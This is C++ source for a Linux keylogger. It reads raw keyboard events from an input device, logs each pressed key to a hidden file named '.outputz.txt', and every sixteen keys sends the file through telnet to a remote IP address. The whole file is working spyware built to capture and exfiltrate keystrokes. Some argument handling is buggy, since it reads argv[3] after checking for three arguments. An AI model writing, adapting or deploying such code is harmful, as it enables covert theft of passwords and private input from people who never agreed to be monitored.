//standard lib
#include <cstdlib>

//io & file stream lib
#include <iostream>
#include <fstream>
#include <iomanip>
using namespace std;

//string library
#include <string>

//event library linux
#include <linux/input.h>


#define PATH "./kloglist2.txt"


int main (int argc, char *argv[])
{

    if (argc!=3)
    {
        cout<<"Usage: start zserver first on remote machineand then sudo ./zklog /dev/input/eventX IPADDRESS"<<endl;
        cout<<"You can find the keyboard file eventX below:"<<endl;
        system("ls -al /dev/input/by-path");
        return 0;
    }
    char *EVENTPATH=argv[2];



    //create a table with event numbers from PATH table[X] should give you the code
    cout<< "Importing events data...."<<flush;
    ifstream infile(PATH);
    string c,ctemp;
    string codestr[1000];

    //find the list of keys
    while((getline(infile,c)))
    {

        if (c=="#define KEY_RESERVED	        0")
        {
            codestr[1]="Reserved";
            break;
        }

    }
    //put them in code
    for(int i=1; i<201; i++)
    {
        getline(infile,c);
        if (!c.empty())
        {
            ctemp=c.substr(12,100);
            ctemp.erase(ctemp.find("\t"),ctemp.length());
            codestr[i]=ctemp;

        }
    }
    infile.close();
cout<<"done"<<endl;

    //listen in the event manager

    struct input_event ev[64];
    int evsize=sizeof(struct input_event);
    ifstream eventinput;
    ofstream eventoutput;
    eventinput.open(EVENTPATH,ios::in|ios::binary);

    //writing in hidden file
    eventoutput.open(".outputz.txt", ofstream::out | ofstream::app);
    bool repeat=false;
    int nb=0;
    cout<< "Listening....on"<<endl;
    while(true)
    {
        eventinput.read((char *)ev,evsize*1);

        if(ev[0].type==1 && ev[0].value==1) //only for pressed keys & avoid repeats
        {
            eventoutput<<codestr[ev[0].code]<<","<<flush; //separate each of the keys with comma

            nb+=1;

            if (nb>15) //send after 15 keys pressed
            {
                cout<<"Sending"<<nb<<"rd/th batch of keys to remote remote"<< argv[3]<<endl;
                string systemcall="cat .outputz.txt | telnet " + (string) argv[3] +"1305 >/dev/null";
                system(systemcall.c_str());
                nb=0;
            }

        }



    }

    return 0;


}
